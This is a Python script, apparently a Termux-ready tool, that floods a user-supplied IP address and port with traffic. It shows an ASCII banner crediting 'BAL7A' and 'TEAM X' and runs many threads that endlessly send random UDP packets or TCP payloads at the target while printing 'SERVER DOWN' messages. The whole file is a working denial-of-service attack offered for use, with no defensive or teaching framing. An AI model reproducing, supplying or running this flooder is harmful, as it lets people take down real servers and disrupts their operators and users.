import random
import socket
import threading

print("\033[92m")
print("""
█████████████████████████████████████████████████████████████████████████████████
                                                                               ██
████████╗███████╗░█████╗░███╗░░░███╗  ██╗░░██╗TEST TEAM ON FC° °999      ██
╚══██╔══╝██╔════╝██╔══██╗████╗░████║  ╚██╗██╔╝X HACKERS° X     °999      ██
░░░██║░░░█████╗░░███████║██╔████╔██║  ░╚███╔╝░ BAL7A °   X     °666      ██
░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║  ░██╔██╗░ DDOS °    X     °555      ██
░░░██║░░░███████╗██║░░██║██║░╚═╝░██║  ██╔╝╚██╗ ATTACK°   X     °444      ██
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝  ╚═╝░░╚═╝ TEST ON PRV°    °333      ██
TEAM X BY BAL7A                                                                ██
                  TERMUX DDOS BY BAL7A X                   █ DDOS X █          ██
                        GIT DDOS ATTACK 5000 PING SERVER   █ DDOS X █          ██
Creat by BAL7A              █FC AHMED MJ█                  █ DDOS X █          ██
BAL7AX YOUTUBE              BAL7A YNIK LKOLL               █ DDOS X █          ██
█████████████████████████████████████████████████████████████████████████████████
""")
print("\033[97m")
ip= str(input(" ip :"))
port= int(input(" port :"))
choice = str(input(" Ddos Attack?? (y/n):"))
times= int(input(" Paket :"))
threads= int(input(" threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" X TEAM DDOS ATTACK!!!")
		except:
			print("[!] SERVER DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" TEAM X BAL7A DDOS ATTACK!!!")
		except:
			s.close()
			print("[*] SERVER DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
